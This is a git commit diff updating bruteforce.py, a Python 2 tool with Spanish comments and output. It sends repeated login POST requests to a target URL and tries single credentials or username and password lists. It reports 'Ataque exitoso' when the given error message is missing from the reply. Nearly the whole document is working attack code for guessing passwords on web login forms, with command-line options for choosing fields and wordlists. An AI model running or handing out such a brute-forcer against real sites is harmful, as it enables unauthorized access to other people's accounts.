a16d4290009574cebd5236168f907b8e08775a4e
root <root@debian>
2017-10-18 04:31:22 -0500

    Bruteforce Update

--- bruteforce.py
+++ bruteforce.py
@@ -12,22 +12,89 @@ userField = ''
 passField = ''
 user = ''
 pwd = ''
+userFile = ''
+pwdFile = ''
+message = ''
 	
 
-def bruteforce(url, userField, passField, user,pwd):
+#def bruteforce(url, userField, passField, user, pwd, userFile, pwdFile, message):
+	
+	
+def single(url, userField, passField, user, pwd, userFile, pwdFile, message):
+	#Antes del ataque
+	mbefore = message
+	#Login
+	payload = { userField : user, passField: pwd}
+	r = requests.post(url, data= payload)
+		
+	mafter =  r.text
+	if mbefore in mafter:
+		print 'Ataque no exitoso con:'  + " User: " + user + " Password: " + pwd
+	else:
+		print "Ataque exitoso con:" + "User: " + user  + " Password: " + pwd
+	
+
+def usersFile(url, userField, passField, user, pwd, userFile, pwdFile, message):
+	users = []
+	if os.path.exists(userFile): #archivo con usuarios
+		fo = open(userFile, 'r')
+		for element in fo:
+			users.append(element)
+		fo.close()
+		
+		for i in range(0,len(users)):
+			#Antes del ataque
+			mbefore = message
+		
+			#Login
+			payload = { userField : users[i], passField: pwd}
+			r = requests.post(url, data= payload)
+	
+			#Login exitoso
+			mafter =  r.text
+			if mbefore in mafter:
+				print 'Ataque no exitoso con:'  + " User: " + users[i] + " Password: " + pwd
+			else:
+				print "Ataque exitoso con:" + " User: " + users[i]  + " Password: " + pwd
+
+def pwdFile(url, userField, passField, user, pwd, userFile, pwdFile, message):
+	passwords = []
+	if os.path.exists(pwdFile): #archivo con usuarios
+		fo = open(pwdFile, 'r')
+		for element in fo:
+			passwords.append(element)
+		fo.close()
+		
+		for i in range(0,len(passwords)):
+			#Antes del ataque
+			mbefore = message
+		
+			#Login
+			payload = { userField : user, passField: passwords[i]}
+			r = requests.post(url, data= payload)
+	
+			#Login exitoso
+			mafter =  r.text
+			if mbefore in mafter:
+				print 'Ataque no exitoso con:'  + " User: " + user + " Password: " + passwords[i]
+			else:
+				print "Ataque exitoso con:" + " User: " + user  + " Password: " + passwords[i]
+
+
+def doubleFile(url, userField, passField, user, pwd, userFile, pwdFile, message):
 	users = []
 	passwords = []
 	i = 0
 	j = 0
 	
-	if os.path.exists(pwd) and os.path.exists(user): # ambos archivos
+	if os.path.exists(userFile) and os.path.exists(pwdFile): # ambos archivos
 		
-		fo = open(user, 'r')
+		fo = open(userFile, 'r')
 		for element in fo:
 			users.append(element)
 		fo.close()
 		
-		fo = open(pwd, 'r')
+		fo = open(pwdFile, 'r')
 		for element in fo:
 			passwords.append(element)
 		fo.close()
@@ -35,119 +102,58 @@ def bruteforce(url, userField, passField, user,pwd):
 		for i in range(0,len(users)):
 			for j in range (0,len(passwords)):
 				#Antes del ataque
-				rb = requests.post(url)
-				tree = fromstring(rb.content)
-				before = tree.findtext('.//title')
-		
+				mbefore = message
 				
 				#Login
 				payload = { userField : users[i], passField: passwords[j]}
+				
 				r = requests.post(url, data= payload)
 	
 				#Login exitoso
-				tree = fromstring(r.content)
-				after =  tree.findtext('.//title')
-				
-				if before in after:
-					print 'Ataque no exitoso con:'  + "\nUser: " + users[i] + "Password: " + passwords[j]
+				mafter =  r.text
+				if mbefore in mafter:
+					print 'Ataque no exitoso con:'  + " User: " + users[i] , " Password: " + passwords[j]
 				else:
-					print "Ataque exitoso con:" + "\nUser: " + users[i]  + "Password: " + passwords[j]
+					print "Ataque exitoso con:" + " User: " + users[i]  , " Password: " + passwords[j]
 					
 				j + 1
 			i + 1
-		exit
+		
 
-	
-	elif os.path.exists(user): #archivo con usuarios
-		print 'entra usr'
-		fo = open(user, 'r')
-		for element in fo:
-			users.append(element)
-		fo.close()
-		
-		for i in range(0,len(users)):
-		
-			#Antes del ataque
-			rb = requests.post(url)
-			tree = fromstring(rb.content)
-			before = tree.findtext('.//title')
-		
-			#Login
-			payload = { userField : users[i], passField: pwd}
-			r = requests.post(url, data= payload)
-	
-			#Login exitoso
-			tree = fromstring(r.content)
-			after =  tree.findtext('.//title')
-	
-			if before in after:
-				print 'Ataque no exitoso con:'  + "\nUser: " + users[i] + "Password: " + pwd
-			else:
-				print "Ataque exitoso con:" + "\nUser: " + users[i]  + "Password: " + pwd
-		exit
-		
-	elif os.path.exists(pwd): # Archivo con passwords
-		
-		fo = open(pwd, 'r')
-		for element in fo:
-			passwords.append(element)
-		fo.close()
-		
-		for i in range(0,len(passwords)):
-		
-			#Antes del ataque
-			rb = requests.post(url)
-			tree = fromstring(rb.content)
-			before = tree.findtext('.//title')
-		
-			#Login
-			payload = { userField : user, passField: passwords[i]}
-			r = requests.post(url, data= payload)
-	
-			#Login exitoso
-			tree = fromstring(r.content)
-			after =  tree.findtext('.//title')
-	
-			if before in after:
-				print 'Ataque no exitoso con:'  + "\nUser: " + user + "Password: " + passwords[i]
-			else:
-				print "Ataque exitoso con:" + "\nUser: " + user  + "Password: " + passwords[i]
-		exit
-	
-	else: # ambas variables
-		#Antes del ataque
-		rb = requests.post(url)
-		tree = fromstring(rb.content)
-		before = tree.findtext('.//title')
-	
-		#Login
-		payload = { userField : user, passField: pwd}
-		r = requests.post(url, data= payload)
-	
-		#Login exitoso
-		tree = fromstring(r.content)
-		after =  tree.findtext('.//title')
-		if before in after:
-			print 'Ataque no exitoso con:'  + "\nUser: " + user + " Password: " + pwd
-		else:
-			print "Ataque exitoso con:" + "\nUser: " + user  + " Password: " + pwd
-		exit
 
 def getParams(arg):
 	parser = argparse.ArgumentParser(description='Fuerza Bruta',
 		formatter_class=argparse.ArgumentDefaultsHelpFormatter)
 
-	parser.add_argument('-b', '--bruteforce',
-	nargs=5,metavar=('url','CampoUsuario','CampoPass', 'Usuario', 'Password') ,help='help:')
-					
+	parser.add_argument('-b', '--bruteforce', help = 'URL Site', required=True)
+	parser.add_argument('-f','--userField', help = 'User Field to attack', required=True)
+	parser.add_argument('-F', '--passField', help = 'Password Field to attack', required=True)
+	parser.add_argument('-u', '--user', help = 'User account')
+	parser.add_argument('-p', '--password', help='User\'s password')
+	parser.add_argument('-U', '--users', help='File with users')
+	parser.add_argument('-P', '--passwords', help='File with passwords')
+	parser.add_argument('-m', '--message', help='Error message', required=True)
 	
+	
+					
 	options = parser.parse_args()
+	
 	
 	if len(sys.argv) == 1:
 		print parser.print_help()
 	
-	elif '-b' in sys.argv or '--bruteforce':
-		bruteforce(options.bruteforce[0],options.bruteforce[1],options.bruteforce[2],options.bruteforce[3], options.bruteforce[4])
+	if options.user is None and options.password is None and options.users is not None and options.passwords is not None:
+		doubleFile(options.bruteforce,options.userField,options.passField,'','',options.users,options.passwords,options.message)
+	elif options.password is None and options.users is None and options.user is not None and options.passwords is not None:
+		pwdFile(options.bruteforce,options.userField,options.passField,options.user,'','',options.passwords,options.message)
+	elif options.user is None and options.passwords is None and options.users is not None and options.password is not None:
+		usersFile(options.bruteforce,options.userField,options.passField,'',options.password,options.users,'',options.message)
+	elif options.users is None and options.passwords is None and options.user is not None and options.password is not None:
+		single(options.bruteforce,options.userField,options.passField,options.user,options.password,'','',options.message)
+	elif options.user is None and options.users is None or options.password is None and options.passwords is None:
+		print parser.print_help()
+		
+
 		
 getParams(arg)
 
